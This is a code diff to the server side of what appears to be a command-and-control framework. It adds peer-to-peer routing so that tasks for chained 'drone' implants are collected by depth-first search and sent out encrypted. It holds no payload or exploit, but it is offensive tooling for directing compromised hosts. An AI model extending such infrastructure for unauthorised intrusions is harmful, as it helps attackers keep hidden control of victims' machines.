@@ -18,6 +18,7 @@ namespace TeamServer.Services;
 public class ServerService : IServerService
 {
     public IDroneService Drones { get; }
+    public IPeerToPeerService PeerToPeer { get; }
     public ITaskService Tasks { get; }
     public ICryptoService Crypto { get; }
     public IReversePortForwardService PortForwards { get; }
@@ -26,21 +27,35 @@ public class ServerService : IServerService
     private readonly IMapper _mapper;
     private readonly List<ServerModule> _modules = new();
 
-    public ServerService(IDroneService drones, ITaskService tasks, IMapper mapper, ICryptoService crypto, IReversePortForwardService portForwards, IHubContext<NotificationHub,INotificationHub> hub)
+    public ServerService(IDroneService drones, IPeerToPeerService peerToPeer, ITaskService tasks, IMapper mapper,
+        ICryptoService crypto, IReversePortForwardService portForwards, IHubContext<NotificationHub, INotificationHub> hub)
     {
         Drones = drones;
+        PeerToPeer = peerToPeer;
         Tasks = tasks;
         Crypto = crypto;
         PortForwards = portForwards;
         Hub = hub;
-        
+
         _mapper = mapper;
-        
+
         LoadModules();
     }
-    
+
     public async Task HandleInboundFrame(C2Frame frame)
     {
+        // do a check-in here, mostly for p2p drones
+        var drone = await Drones.Get(frame.DroneId);
+        
+        if (drone is not null)
+        {
+            drone.CheckIn();
+            
+            await Drones.Update(drone);
+            await Hub.Clients.All.DroneCheckedIn(drone.Metadata.Id);
+        }
+        
+        // handle the inbound frame
         var module = _modules.First(m => m.FrameType == frame.Type);
         await module.ProcessFrame(frame);
     }
@@ -51,34 +66,39 @@ public class ServerService : IServerService
         await HandleCheckIn(metadata);
         
         var outbound = new List<C2Frame>();
-        var pending = (await Tasks.GetPending(metadata.Id)).ToList();
+        var search = PeerToPeer.DepthFirstSearch(metadata.Id);
 
-        foreach (var record in pending)
+        foreach (var droneId in search)
         {
-            // update status and date
-            record.Status = TaskStatus.TASKED;
-            record.StartTime = DateTime.UtcNow;
+            var pending = (await Tasks.GetPending(droneId)).ToList();
 
-            // map it to a task
-            var task = _mapper.Map<TaskRecord, DroneTask>(record);
+            foreach (var record in pending)
+            {
+                // update status and date
+                record.Status = TaskStatus.TASKED;
+                record.StartTime = DateTime.UtcNow;
 
-            // encrypt it
-            var enc = await Crypto.Encrypt(task);
+                // map it to a task
+                var task = _mapper.Map<TaskRecord, DroneTask>(record);
 
-            // pack into a frame
-            outbound.Add(new C2Frame(record.DroneId, FrameType.TASK, enc));
+                // encrypt it
+                var enc = await Crypto.Encrypt(task);
+
+                // pack into a frame
+                outbound.Add(new C2Frame(record.DroneId, FrameType.TASK, enc));
             
-            // tell hub
-            await Hub.Clients.All.TaskUpdated(record.DroneId, record.TaskId);
+                // tell hub
+                await Hub.Clients.All.TaskUpdated(record.DroneId, record.TaskId);
+            }
+        
+            // update db
+            await Tasks.Update(pending);
+        
+            // add any cached frames
+            outbound.AddRange(Tasks.GetCachedFrames(droneId));
         }
-        
-        // update db
-        await Tasks.Update(pending);
-        
-        // add any cached frames
-        outbound.AddRange(Tasks.GetCachedFrames(metadata.Id));
 
-        return outbound.ToArray();
+        return outbound.ToArray().Reverse();
     }
 
     private async Task HandleCheckIn(Metadata metadata)
@@ -89,6 +109,7 @@ public class ServerService : IServerService
         {
             drone = new Drone(metadata);
 
+            PeerToPeer.AddVertex(drone.Metadata.Id);
             await Drones.Add(drone);
             await Hub.Clients.All.NewDrone(drone.Metadata.Id);
         }
